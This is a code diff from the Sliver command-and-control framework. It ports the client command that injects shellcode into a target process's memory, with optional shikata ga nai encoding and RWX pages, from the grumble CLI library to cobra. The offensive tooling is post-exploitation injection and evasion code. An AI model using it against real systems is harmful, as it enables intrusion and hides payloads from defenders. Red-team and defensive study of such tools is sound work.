@@ -33,25 +33,25 @@ import (
 	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
-	"github.com/desertbit/grumble"
+	"github.com/spf13/cobra"
 )
 
 // ExecuteShellcodeCmd - Execute shellcode in-memory
-func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
+func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverConsole, args []string) {
 	session, beacon := con.ActiveTarget.GetInteractive()
 	if session == nil && beacon == nil {
 		return
 	}
 
-	rwxPages := ctx.Flags.Bool("rwx-pages")
-	interactive := ctx.Flags.Bool("interactive")
+	rwxPages, _ := cmd.Flags().GetBool("rwx-pages")
+	interactive, _ := cmd.Flags().GetBool("interactive")
 	if interactive && beacon != nil {
 		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
 		return
 	}
-	pid := ctx.Flags.Uint("pid")
-	shellcodePath := ctx.Args.String("filepath")
+
+	pid, _ := cmd.Flags().GetUint("pid")
+	shellcodePath := args[0]
 	shellcodeBin, err := os.ReadFile(shellcodePath)
 	if err != nil {
 		con.PrintErrorf("%s\n", err.Error())
@@ -61,18 +61,18 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
 		return
 	}
-	shikataGaNai := ctx.Flags.Bool("shikata-ga-nai")
+	shikataGaNai, _ := cmd.Flags().GetBool("shikata-ga-nai")
 	if shikataGaNai {
 		if !rwxPages {
 			con.PrintErrorf("Cannot use shikata ga nai without RWX pages enabled\n")
 			return
 		}
-		arch := ctx.Flags.String("architecture")
+		arch, _ := cmd.Flags().GetString("architecture")
 		if arch != "386" && arch != "amd64" {
 			con.PrintErrorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
 			return
 		}
-		iter := ctx.Flags.Int("iterations")
+		iter, _ := cmd.Flags().GetInt("iterations")
 		con.PrintInfof("Encoding shellcode ...\n")
 		resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
 			Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
@@ -90,8 +90,10 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintInfof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
 	}
 
+	process, _ := cmd.Flags().GetString("process")
+
 	if interactive {
-		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, rwxPages, con)
+		executeInteractive(cmd, process, shellcodeBin, rwxPages, con)
 		return
 	}
 	ctrl := make(chan bool)
@@ -101,7 +103,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		Data:     shellcodeBin,
 		RWXPages: rwxPages,
 		Pid:      uint32(pid),
-		Request:  con.ActiveTarget.Request(ctx),
+		Request:  con.ActiveTarget.Request(cmd),
 	})
 	ctrl <- true
 	<-ctrl
@@ -126,7 +128,7 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 }
 
 // PrintExecuteShellcode - Display result of shellcode execution
-func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient) {
+func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsole) {
 	if task.Response.GetErr() != "" {
 		con.PrintErrorf("%s\n", task.Response.GetErr())
 	} else {
@@ -134,7 +136,7 @@ func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient
 	}
 }
 
-func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverConsoleClient) {
+func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverConsole) {
 	// Check active session
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
@@ -149,7 +151,6 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
 		SessionID: session.ID,
 	})
-
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return
@@ -158,12 +159,11 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
 	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
-		Request:   con.ActiveTarget.Request(ctx),
+		Request:   con.ActiveTarget.Request(cmd),
 		Path:      hostProc,
 		EnablePTY: !noPty,
 		TunnelID:  tunnel.ID,
 	})
-
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
 		return
@@ -175,7 +175,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
 	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
-		Request:  con.ActiveTarget.Request(ctx),
+		Request:  con.ActiveTarget.Request(cmd),
 		Pid:      pid,
 		Data:     shellcode,
 		RWXPages: rwxPages,
